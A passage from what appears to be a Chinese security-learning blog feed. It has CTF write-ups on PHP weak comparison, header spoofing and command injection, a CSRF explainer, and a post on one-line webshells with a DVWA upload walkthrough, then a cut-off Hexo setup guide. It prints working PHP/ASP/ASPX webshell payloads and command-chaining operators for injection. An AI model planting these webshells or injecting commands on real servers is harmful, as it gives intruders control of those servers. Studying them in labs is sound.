simple_php"></a>4` simple_php</h3><p>　　本题浏览源码可知，考察点在于 PHP 的弱类型比较。故按照题目要求，构造 a=a，b=1235a 即可得到flag。</p><h5 id="在这里总结记录一下碰到过的-PHP-弱类型比较。"><a href="#在这里总结记录一下碰到过的-PHP-弱类型比较。" class="headerlink" title="在这里总结记录一下碰到过的 PHP 弱类型比较。"></a>在这里总结记录一下碰到过的 PHP 弱类型比较。</h5><p>　　首先介绍一下相关概念，HTML 表单并不传递整数、浮点数或者布尔值，它们只传递字符串。要想检测一个字符串是不是数字，可以使用 is_numeric() 函数。在 PHP 中有两种比较是否相等的符号 == 与 === 。<br>　　等于 == ，当等号两边为相同类型时，直接比较值是否相等，当等号两边类型不同时，先转换为相同的类型，再对转换后的值进行比较。<br>　　全等 === ，在进行比较的时候，首先判断等号两边的类型是否相等，如果不同，则直接返回 false，如果相同，再进行比较值是否相等。<br>　　举一个简单的例子，变量a为数字1，变量b为字符’1’，在 PHP 中，$a == $b 会返回 true ，而 $a === $b 则会返回 false。<br>　<br>　　当字符串与数字比较时，首先将字符串转换为数字，不能转换为数字的字符串或 NULL ，被转换为0。例如， “abc” 是不能转换为数字的字符串，而 “123” 、”123a” 、”0x12” 或 “2e3” 是可以转换为数字的字符串。PHP 手册中相关描述如下：<br>　　<strong>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行。</strong><br>　　一个字符串的开始部分决定了它转化成数值后的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。　<br>　　<strong>在进行比较运算时，如果遇到了 “ 0e\d+ “ 这种字符串，PHP 就会将这种字符串解析为科学计数法。</strong></p><table><thead><tr><th>例子</th><th>字符串转化后的数值</th><th>结果</th></tr></thead><tbody><tr><td>“admin”==0</td><td>0</td><td>true</td></tr><tr><td>“1admin”==1</td><td>1</td><td>true</td></tr><tr><td>“admin1”==1</td><td>0</td><td>false</td></tr><tr><td>“0e123456”==”0e456789”</td><td>0，字符串解析为科学计数法</td><td>true</td></tr><tr><td>“0e123456a”==”0e456789a”</td><td>字符串与字符串类型直接比较，无转换</td><td>false</td></tr><tr><td>“1e3b31”==1000</td><td>1000</td><td>true</td></tr><tr><td>“2e3”==2000</td><td>2000</td><td>true</td></tr><tr><td>“2E3”==2</td><td>2000</td><td>false</td></tr><tr><td>“0x12”==0</td><td>0</td><td>true</td></tr><tr><td>0x12==18</td><td>—</td><td>true</td></tr></tbody></table><p>　　MD5绕过就是以上知识的一种实际应用，举个例子，假如我们需要找到两个字符串，它们不相等，但是md5的值却 弱相等，这种字符串要怎么找呢，一种方法是我们只需要找到对应md5的值都以0e开头后接数字的两个字符串即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">md5(&quot;s878926199a&quot;)&#x3D;&#x3D;md5(&quot;s155964671a&quot;)为 true。</span><br><span class="line">md5(&quot;s878926199a&quot;)为 &quot;0e545993274517709034328855841020&quot;;</span><br><span class="line">md5(&quot;s155964671a&quot;)为 &quot;0e342768416822451524974117254469&quot;;</span><br><span class="line">两个字符串均为&quot;0e\d+&quot;格式，均被解析为科学计数法，数值都等于0。</span><br></pre></td></tr></table></figure><p>　　其它比较运算与等于类似，在这里附上 PHP 手册中相关内容的地址：<br>　　<a href="https://www.php.net/manual/zh/types.comparisons.php" target="_blank" rel="noopener">PHP：PHP 类型比较表</a><br>　　<a href="https://www.php.net/manual/zh/language.operators.comparison.php" target="_blank" rel="noopener">PHP：比较运算符</a></p><h3 id="5-xff-referer"><a href="#5-xff-referer" class="headerlink" title="5` xff_referer"></a>5` xff_referer</h3><p>　　根据题目信息可知，本题与 <em>X-Forwarded-For</em> 和 <em>Referer</em> 有关。进入网页，发现题目要求登录ip地址必须为123.123.123.123，于是使用 Burpsuite 进行抓包，在请求头添加一项 <code>X-Forwarded-For:123.123.123.123</code> 后重发，发现如下回显：</p><p><img src="https://img-blog.csdnimg.cn/20200709144513998.png" alt="在这里插入图片描述"><br>　　既然题目要求请求必须来自谷歌，于是再在请求头中添加一项 <code>referer:https://www.google.com</code> 后重发即可，在网页响应中即可看到 flag。</p><h6 id="X-Forwarded-For："><a href="#X-Forwarded-For：" class="headerlink" title="X-Forwarded-For："></a>X-Forwarded-For：</h6><p>简称XFF头，它代表客户端，也就是 HTTP 的请求端真实的IP，换句话说，XFF头就是告诉服务器当前请求者的IP地址的 HTTP 请求头字段。它的标准格式为 <em>X-Forwarded-For: client1, proxy1, proxy2</em> ，从标准格式可以看出，XFF头信息可以有多个，中间用逗号分隔，第一项为真实的客户端ip，剩下的就是曾经经过的代理或负载均衡的ip地址，经过几个就会出现几个。</p><h6 id="Referer："><a href="#Referer：" class="headerlink" title="Referer："></a>Referer：</h6><p>HTTP Referer是 header 的一部分，当浏览器向 WEB 服务器发送请求的时候，一般会带上 Referer ，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</p><h3 id="6-command-execution"><a href="#6-command-execution" class="headerlink" title="6` command_execution"></a>6` command_execution</h3><p>　　本题的考察点为命令执行漏洞。当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如 PHP 中的 system、exec、shell_exec 等，当用户可以控制命令执行函数中的参数时，将可以注入恶意系统命令到正常命令中，造成命令执行攻击。<br>　　进入本题网页，首先试试输入127.0.0.1来观察一下回显。</p><p><img src="https://img-blog.csdnimg.cn/20200709234703159.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>　　这里涉及到另外一个知识点，即如何从PING命令的回显来判断操作系统的类型。<strong>一般来说，我们可以通过查看TTL值从而判断操作系统类型</strong>。确定目标系统后，即可使用对应系统的相关系统命令来寻找 flag。</p><ul><li>TTL=128，这是 <em>WINNT/2K/XP</em>。</li><li>TTL=32，这是 <em>WIN95/98/ME</em>。</li><li>TTL=256，这是 <em>UNIX</em>。</li><li>TTL=64，这是 <em>LINUX</em>。</li></ul><p>　　本题目标系统为 LINUX，因此我们可以使用 LINUX 的查找命令以 flag 为关键词试试搜索相关文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -name &quot;flag*&quot;</span><br></pre></td></tr></table></figure><p><strong>关于 LINUX 的常用系统命令可参考以下博客</strong>：<a href="https://blog.csdn.net/qq_23853743/article/details/84037598" target="_blank" rel="noopener">Linux系统常用基本命令总结</a><br><strong>关于 WINDOWS 的常用系统命令可参考以下博客</strong>：<a href="https://blog.csdn.net/qq_23994787/article/details/79498299" target="_blank" rel="noopener">windows系统常用命令</a></p><p><img src="https://img-blog.csdnimg.cn/20200711121555691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>　　可以发现题目没有对用户输入的参数进行过滤，在回显中我们可以明显的看到 flag 文件的路径，接下来使用 cat 命令显示该文件内容即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;flag.txt</span><br></pre></td></tr></table></figure><p>　　本题题目把用户输入的参数不经过过滤直接放在 PING 命令之后，因此攻击者可以在输入的参数后用连接符截断再加上新的系统命令，进而执行该新命令。</p><p><strong>常见的 LINUX 命令间的连接符如下</strong>：</p><table><thead><tr><th>连接符</th><th>举例</th><th>效果</th></tr></thead><tbody><tr><td>;</td><td>A;B</td><td>按顺序依次执行，先执行命令A，再执行命令B</td></tr><tr><td>|</td><td>A|B</td><td>管道符，命令A执行成功后，命令A的输出会交给命令B继续处理。若命令A执行失败，则会报错，若命令B无法处理命令A的输出，也会报错。</td></tr><tr><td>&amp;&amp;</td><td>A&amp;&amp;B</td><td>逻辑与关系，命令A执行成功后，才会执行命令B；命令A执行失败，则命令B不被执行。</td></tr><tr><td>||</td><td>A||B</td><td>逻辑或关系，命令A执行失败后，才会执行命令B；命令A执行成功，则命令B不被执行</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全 // CSRF(跨站请求伪造)</title>
      <link href="/2020/06/17/Web%E5%AE%89%E5%85%A8-CSRF(%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)/"/>
      <url>/2020/06/17/Web%E5%AE%89%E5%85%A8-CSRF(%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>　　跨站请求伪造（Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，<strong>XSS 利用的是用户对指定网站的信任</strong>，<strong>CSRF 利用的是网站对用户网页浏览器的信任</strong>。</p><a id="more"></a><h2 id="二、用处"><a href="#二、用处" class="headerlink" title="二、用处"></a>二、用处</h2><p>　　简单来说，CSRF 攻击就是攻击者盗用了用户的身份，然后以用户的名义去发送恶意请求。CSRF 能够做许多事情，例如：以用户的名义发送邮件、发表博客、盗取账号甚至于购买商品、交易转账……</p><h2 id="三、攻击原理"><a href="#三、攻击原理" class="headerlink" title="三、攻击原理"></a>三、攻击原理</h2><p>　　我们知道，绝大多数网站都是通过 Cookie 等方式来辨识用户身份再予以授权的。因此攻击者可以利用用户在浏览器端保存的 Cookie 等认证信息，向相应的站点发送伪造请求，由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了 Web 中用户身份验证的一个漏洞：<strong>简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</strong></p><p><img src="https://img-blog.csdnimg.cn/20200617210102529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200617210422319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="四、示例"><a href="#四、示例" class="headerlink" title="四、示例"></a>四、示例</h2><p>　　假如某论坛网站的发贴是通过 GET 请求访问，点击发表后 JS 把发贴内容拼接成目标 URL 并访问：</p><p><code>http://www.someforum.com/bbs/create_post.php?title=标题&amp;content=内容</code></p><p>　　那么攻击者可以在某网站中插入一个 HTML 的 img 标签如下：<br>　　<br><code>&lt;img src=http://www.someforum.com/bbs/create_post.php?title=暂时没想到什么花里胡哨的标题&amp;content=同上&gt;</code></p><p>　　当用户登录该论坛后，若又访问了攻击者的危险网站，那么用户的帐户就会在其不知情的情况下发表这一新帖子。<br>　　原因在于，当用户访问攻击者的危险网站时，浏览器在解析网页时会自动向 img 标签中的 src 属性中的地址发送请求。然而此时用户在论坛的登录信息仍保存在 cookie 中，其登录信息尚未过期，所以浏览器会带上登录信息去向论坛服务器请求，服务器在收到请求后根据 Cookie 判断此操作是用户所为，进而进行发表操作。<br>　　这种恶意的请求网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。透过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的是，<strong>欺骗用户浏览器，让其以用户的名义运行操作</strong>。　　</p><h2 id="五、防御手段"><a href="#五、防御手段" class="headerlink" title="五、防御手段"></a>五、防御手段</h2><p>　　虽然现实中很少有网站会使用GET请求来执行包含数据更改等敏感操作，但这并不意味着就可以避免 CSRF 攻击。CSRF 攻击可分为许多种类，按请求类型，可分为 GET 型和 POST 型；按攻击方式，可分为 HTML CSRF、JSON HiJacking、Flash CSRF 等。由于发起请求的方式多种多样，几乎没有彻底杜绝 CSRF 攻击的方式，但我们可以采取各种方式来提高攻击的门槛，例如：</p><h5 id="检查Referer字段"><a href="#检查Referer字段" class="headerlink" title="检查Referer字段"></a>检查Referer字段</h5><p>　　HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。</p><h5 id="添加校验token"><a href="#添加校验token" class="headerlink" title="添加校验token"></a>添加校验token</h5><p>　　由于CSRF的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在cookie中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再运行CSRF攻击。这种数据通常是窗体中的一个数据项。服务器将其生成并附加在窗体中，其内容是一个伪随机数。当客户端通过窗体提交请求时，这个伪随机数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪随机数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪随机数的值，服务端就会因为校验token的值为空或者错误，拒绝这个可疑请求。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CSRF(跨站请求伪造) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全 // 一句话木马</title>
      <link href="/2020/06/12/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
      <url>/2020/06/12/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>　　在介绍一句话木马之前，我们先来简单了解一下 <strong><em>WebShell</em></strong> 的相关概念。</p><a id="more"></a><p>　　Webshell 就是以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。<br>　　顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。</p><p>　　webshell 根据功能大致可分为大马、小马以及一句话木马。</p><blockquote><p><img src="https://img-blog.csdnimg.cn/20200612184915972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></blockquote><h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><p>　　顾名思义，一句话木马的代码极短，通常只有一句话。但这并不意味着它无关紧要，相反，它由于短小精悍，功能强大，隐蔽性非常好，在渗透入侵中始终扮演着强大的作用。常见的一句话木马有以下几种形式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php的一句话木马：</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'pass'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">asp的一句话木马：</span><br><span class="line">&lt;%execute(request(<span class="string">"value"</span>))%&gt;</span><br><span class="line">aspx的一句话木马：</span><br><span class="line">&lt;%@ Page Language=<span class="string">"Jscript"</span>%&gt;    &lt;%<span class="keyword">eval</span>(Request.Item[<span class="string">"value"</span>])%&gt;</span><br></pre></td></tr></table></figure><h2 id="二、基本原理"><a href="#二、基本原理" class="headerlink" title="二、基本原理"></a>二、基本原理</h2><p>　　我们以最简单普遍的一句话木马 <code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code> 为例，来分析其组成。<br>　　首先是 @ 符号，它在 PHP 中是一个错误控制运算符，当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都会被忽略掉。例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如果去掉了@符号，而又没有通过POST方法接收到pass变量</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'pass'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">服务器就会报一个提醒，类似于：Notice: Undefined index: pass in ......</span><br><span class="line">原因在于我们使用了一个未定义的变量pass</span><br></pre></td></tr></table></figure><p>　　其次就是 eval() 函数，在 PHP 中 eval() 函数把字符串按照 PHP 代码来计算，该字符串必须是合法的 PHP 代码，且必须以分号结尾。例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">示例一：</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="string">"echo 'a';"</span>); <span class="meta">?&gt;</span></span><br><span class="line">该语句等效于<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">'a'</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">示例二：</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'pwd'</span>]); <span class="meta">?&gt;</span></span><br><span class="line">然后利用POST方法接受pwd变量，例如pwd=<span class="keyword">echo</span> <span class="string">'a'</span>;</span><br><span class="line">以上语句就等效为<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="string">"echo 'a';"</span>); <span class="meta">?&gt;</span></span><br><span class="line">即等效为<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">'a'</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>　　该函数是整个一句话木马的核心所在，简单来说，就是我们想要执行什么代码，就把什么代码放进变量 pwd 中，然后利用 POST 方法传输给一句话木马即可执行。</p><h2 id="三、使用方法"><a href="#三、使用方法" class="headerlink" title="三、使用方法"></a>三、使用方法</h2><p>　　利用一句话木马结合 <strong><em>中国蚁剑</em></strong>、<strong><em>中国菜刀</em></strong> 等工具，通过 <strong><em>文件上传漏洞</em></strong> （文件上传漏洞是指由于服务器对于用户上传部分的控制不严格导致攻击者可以上传一个恶意的可执行的文件到服务器。简单点说，就是用户直接或者通过各种绕过方式将Webshell上传到服务器中进而执行利用）可以方便快捷的进行渗透。<br>　　简单来说只要攻击者满足以下三个条件，就能实现成功渗透：<br>① 木马上传成功，未被杀；<br>② 知道木马的路径在哪；<br>③ 上传的木马能正常运行。</p><h2 id="四、渗透测试"><a href="#四、渗透测试" class="headerlink" title="四、渗透测试"></a>四、渗透测试</h2><p>　　我们可以通过 <strong><em>DVWA</em></strong> 平台来进行一个简单的渗透试验。</p><h5 id="首先准备好我们的一句话木马文件"><a href="#首先准备好我们的一句话木马文件" class="headerlink" title="首先准备好我们的一句话木马文件"></a>首先准备好我们的一句话木马文件</h5><p><img src="https://img-blog.csdnimg.cn/20200612190003227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="然后进入-DVWA-平台，将其安全级别设置为LOW"><a href="#然后进入-DVWA-平台，将其安全级别设置为LOW" class="headerlink" title="然后进入 DVWA 平台，将其安全级别设置为LOW"></a>然后进入 DVWA 平台，将其安全级别设置为LOW</h5><p>然后我们可以先查看一下在此安全级别下，文件上传漏洞的后台源码</p><p><img src="https://img-blog.csdnimg.cn/20200612190339717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看出，在此安全级别下后台对上传的文件没有任何限制与验证，因此我们可以直接上传我们的 php 一句话木马文件</p><p><img src="https://img-blog.csdnimg.cn/20200612191032769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到文件上传成功后，平台会提示我们木马文件的保存路径，我们可以打开相关路径确认一下</p><p><img src="https://img-blog.csdnimg.cn/20200612191430687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="接下来我们可以借助中国蚁剑来进行连接"><a href="#接下来我们可以借助中国蚁剑来进行连接" class="headerlink" title="接下来我们可以借助中国蚁剑来进行连接"></a>接下来我们可以借助中国蚁剑来进行连接</h5><p>右键蚁剑空白处选择添加数据，然后填写好相关信息，连接密码为一句话木马中的变量名，URL 地址为网站的主路径然后加上上传文件时平台回显的文件保存路径</p><p><img src="https://img-blog.csdnimg.cn/20200612191900459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>连接成功后双击即可进入</p><p><img src="https://img-blog.csdnimg.cn/20200612192234704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200612192454904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODA1NDIw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到，我们现在可以通过木马对磁盘中的任何文件进行访问甚至进行增删改查！至此，渗透测试成功。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 一句话木马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 hexo + github 搭建免费个人博客教程</title>
      <link href="/2020/06/05/%E4%BD%BF%E7%94%A8-hexo-github-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/"/>
      <url>/2020/06/05/%E4%BD%BF%E7%94%A8-hexo-github-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>　　最近也没学啥新东西，恰巧看到学长在搭自己的博客，然后兴趣使来，就也想整一个简单的个人博客，然后由于种种原因，这个过程进行的并不是那么的顺利，于是就有了这篇博客，借此记录也希望观者能顺利的搭建属于自己的个人博客。<br>（PS：今天刚整明白搭博客，还没搞明白图片的插入以及美化排版啥的，先将就着看看hh）</p><a id="more"></a><h2 id="一、借助Github搭建博客"><a href="#一、借助Github搭建博客" class="headerlink" title="一、借助Github搭建博客"></a>一、借助Github搭建博客</h2><p>　　借助Github搭建博客有许多优点，<br>1.无需自己搭建服务器（零成本！）<br>2.可以绑定自己的域名（虽然不是广义上的私人订制）<br>3.使用标记语言，比如Markdown<br>　　当然由于是零成本、纯白嫖，肯定限制也是不少的，比如做出来的博客是静态网页，然后由于是基于GIT来对博客进行操作，很多东西都得靠命令来实现，但是总的来说用来搭建个人博客还是极好的选择。下面来正经介绍操作流程：<br>1.注册一个Github账号，这没啥好说的<br>2.创建一个仓库，仓库名为 你注册时的用户名（不是昵称）.github.io ，将来你的个人博客的域名就是这个了，是不是很简单<br>3.仓库创建成功后可能会有延迟，也就是可能得等一段时间才能生效</p><h2 id="二、搭建Hexo"><a href="#二、搭建Hexo" class="headerlink" title="二、搭建Hexo"></a>二、搭建Hexo</h2><p>　　Hexo是一款基于Node.js的静态博客框架，依赖少易于安装使用，可以方便的生成静态网页托管在GitHub和Coding上，是搭建博客的首选框架。在Hexo上面有许多现成的个人博客网站模板，安装部署完成后我们可以直接使用，也可以对其进行个性化的改造。Hexo的搭建步骤相比Github的操作复杂了许多，也就是它让我摸索了很长时间，然后可能是由于版本更新，导致网上的老教程都不太靠谱（至少对我来说挺坑的…），然后下面来详细介绍一下搭建步骤，建议在安装过程中关闭杀毒软件，因为会导致某些操作无法成功：</p><p>1.安装Git<br>2.安装Nodejs<br>3.安装Hexo</p><h4 id="1-安装Git"><a href="#1-安装Git" class="headerlink" title="1.安装Git"></a>1.安装Git</h4><p>　　到官网下载Git<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">https://git-scm.com/downloads</a>.安装的时候一路点击Next就行，因为我也不知道都是些啥…反正默认就对了hh</p><h4 id="2-安装Nodejs"><a href="#2-安装Nodejs" class="headerlink" title="2.安装Nodejs"></a>2.安装Nodejs</h4><p>　　这玩意和第三步的网上教程坑死我了…　whatever，首先还是先去官网把它下载下来<a href="https://nodejs.org/zh-cn/" target="_blank" rel="noopener">https://nodejs.org/zh-cn/</a>.然后安装为了防止后面出现乱七八糟的错误还是推荐默认选项，安装位置它要c盘就c盘吧，c盘应该也不缺这么点空间。<br>　　安装完成后，键盘同时按住（WIN+R）呼出运行，输入cmd运行命令提示符，然后输入node -v，如果正常显示版本号既nodejs安装成功，再输入npm -v，同理显示版本号即可。关于npm，npm的作用就是对Node.js依赖的包进行管理，也可以理解为用来安装/卸载Node.js需要装的东西，新版的nodejs自带npm，安装时两者一起安装。<br>　　到此剩下的步骤就是和网上的教程区别最大的地方，根据我一下午的尝试，安装时nodejs会自动在D盘创建一个叫NodeJS的文件夹，里面包括node_global和node_cache这两个子文件夹，（而如果按照网上的教程这两个文件夹需要你自己可选创建，然后还要设置一堆乱七八糟的东西），接下来我们需要设置电脑的环境变量，基本步骤是右键计算机，选择属性，选择左边的高级系统设置，选择环境变量。这里我们应该是需要设置两个地方就行，第一个是上面的用户变量，双击path进入编辑，将带AppData\Roaming\npm的这一行删除，替换为D:\NodeJS\node_global，点击确定即可，第二个是下面的系统变量，新建一个NODE_PATH，然后在下面那行输入D:\NodeJS\node_global\node_modules，点击确定即可。</p><h4 id="3-安装Hexo"><a href="#3-安装Hexo" class="headerlink" title="3.安装Hexo"></a>3.安装Hexo</h4><p>　　鼠标右键点击桌面，如果Git安装成功的话右键菜单中会多出两个选项，选择其中的Git Bash，然后再出现的窗口中输入npm install hexo-cli -g，敲回车，然后在电脑的某个地方新建一个名为hexo的文件夹（名字和位置都随意），但是由于这个文件夹将来就作为你存放网站相关代码的地方，所以最好不要随便放。右键这个文件夹，同样选择Git Bash，输入hexo init，回车，hexo会自动下载一些文件到这个目录，然后我们再打开电脑的环境变量，在下面的系统变量中找到path，双击进入，添加新的一行内容为D:\NodeJS\node_global\node_modules\hexo\bin，然后我们可以在hexo中输入hexo -v，查看版本号同上，然后我们可以输入hexo -g，回车，再输入hexo -s，回车，执行以上命令之后打开浏览器访问 <a href="http://localhost:4000" target="_blank" rel="noopener">http://localhost:4000</a> 即可看到hexo为我们提供的默认页面。</p><h2 id="三、将我们的个人博客上传到Github"><a href="#三、将我们的个人博客上传到Github" class="headerlink" title="三、将我们的个人博客上传到Github"></a>三、将我们的个人博客上传到Github</h2><p>　　